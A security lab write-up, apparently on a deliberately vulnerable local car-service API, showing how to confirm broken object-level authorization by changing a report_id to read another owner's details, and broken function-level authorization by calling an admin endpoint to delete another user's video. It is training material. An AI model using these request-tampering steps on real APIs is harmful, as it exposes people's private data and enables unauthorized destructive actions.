
---

# 📖 High-Level Summary:

### Steps to Identify and Exploit BOLA:

**BOLA (Broken Object Level Authorization)** occurs when an application fails to enforce proper access control on individual objects. In this lab, BOLA is confirmed when the user (John) is able to access another user's mechanic report and vehicle details by modifying the `report_id` in the API endpoint. This demonstrates a lack of authorization checks at the object level, exposing sensitive data like vehicle owner information, emails, and phone numbers.

---

### Steps to Identify and Exploit BLFA:

**BLFA (Broken Function Level Authorization)** occurs when an application fails to restrict access to sensitive functions, allowing unauthorized users to perform actions reserved for privileged roles (e.g., admin). In this lab, BLFA is confirmed when the user modifies the API endpoint for deleting videos from the user-specific API to the admin API. This bypasses function-level restrictions and allows the user to delete another user's video, a privilege meant only for admins.

---

# 📚 Definition Bank:

### BOLA (Broken Object Level Authorization)

- **Definition:** Occurs when users can access objects (like other users' data) by manipulating object identifiers without proper authorization.
- **Impact:** Privacy breaches, exposure of sensitive data, and potential escalation of privileges.

### BLFA (Broken Function Level Authorization)

- **Definition:** Occurs when users can perform restricted functions due to improper authorization at the function level.
- **Impact:** Unauthorized users can access admin-level functions, bypass restrictions, and manipulate data.

---

# 🎯 Steps to Identify and Exploit BOLA:

### Step 1: Logging into the Dashboard

- Visit:
    
    ```plaintext
    http://localhost:8888/dashboard
    ```
    
- Click **Contact Mechanic** to load the service request form.

---

### Step 2: Capturing Traffic with Burp Suite

- Fill in the form with:
    - **VIN:** `1GIGF95XMMN431588`
    - **Mechanic Name:** `TRAC_JHN`
    - **Problem Description:** `test_data_123` (for easy identification).
- Submit the form, and capture the **POST request** in Burp Suite:
    
    ```http
    POST /workshop/api/merchant/contact_mechanic
    ```
    
- **Request Body:**
    
    ```json
    {
      "mechanic_code": "TRAC_JHN",
      "problem_details": "test_data_123",
      "vin": "1GIGF95XMMN431588",
      "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
      "repeat_request_if_failed": false,
      "number_of_repeats": 1
    }
    ```
    

---

### Step 3: Discovering Hidden API Endpoints

- Inspect the response:
    
    ```json
    {
      "response_from_mechanic_api": {
        "id": 6,
        "sent": true,
        "report_link": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=6"
      },
      "status": 200
    }
    ```
    
- Take note of the hidden API endpoint: `/api/mechanic/receive_report`.

---

### Step 4: Exploiting BOLA via Postman

- Use Postman to send a **GET request** to:
    
    ```plaintext
    http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=4
    ```
    
- **Headers:** Include the user's `Authorization` cookie:
    
    ```plaintext
    Bearer <user_token>
    ```
    
- **Response:**
    
    ```json
    {
      "id": 4,
      "mechanic": {
        "mechanic_code": "TRAC_JME",
        "user": {
          "email": "james@example.com"
        }
      },
      "vehicle": {
        "vin": "8VAUI03PRUQ686911",
        "owner": {
          "email": "pogba006@example.com",
          "number": "9876570006"
        }
      },
      "problem_details": "My car MG Motor - Hector Plus is having issues."
    }
    ```
    
- ✅ **BOLA Confirmed:** User John was able to access data for another vehicle owner, exposing sensitive information.

---

# 🎯 Steps to Identify and Exploit BLFA:

### Step 1: Uploading a Video

1. Log into the account at:
    
    ```plaintext
    http://localhost:8888/my-profile
    ```
    
2. Upload `car.mp4`:
    
    ```plaintext
    POST /identity/api/v2/user/videos
    ```
    
3. Capture the **response** in Burp Suite:
    
    ```json
    {
      "id": 52,
      "video_name": "car.mp4",
      "conversion_params": "-v codec h264",
      "profileVideo": "..."
    }
    ```
    

---

### Step 2: Bypassing Authorization to Delete a Video

1. Use Postman to:
    
    - **Sign up and log in as a new user.**
    - Upload a new video (e.g., `car.mp4`), obtaining a new video ID (e.g., `53`).
2. Attempt to delete another user’s video:
    
    ```plaintext
    DELETE {{url}}/identity/api/v2/user/videos/52
    ```
    
    - **Response:**
        
        ```json
        {
          "message": "This is an admin function. Try to access the admin API",
          "status": 403
        }
        ```
        
3. Modify the endpoint to target the **admin API**:
    
    ```plaintext
    DELETE {{url}}/identity/api/v2/admin/videos/52
    ```
    
    - **Response:**
        
        ```json
        {
          "message": "User video deleted successfully.",
          "status": 200
        }
        ```
        

- ✅ **BLFA Confirmed:** Unauthorized user performed an admin-level action to delete another user’s video.

---

# ❓ Why Are These Vulnerabilities Critical?

### BOLA:

- **Cause:** Missing access control on object-level requests.
- **Impact:** Sensitive data exposure, privacy violations.

### BLFA:

- **Cause:** Missing function-level authorization checks.
- **Impact:** Unauthorized users performing admin-level operations.

---

# ✅ Key Takeaways:

- **Always Implement Proper Authorization:** Validate permissions for every request, object, and function.
- **Test for Vulnerabilities Early:** Use tools like Burp Suite and Postman to simulate real-world attacks.
- **Protect APIs with Tokens:** Use RBAC (Role-Based Access Control) and token validation to secure sensitive endpoints.

---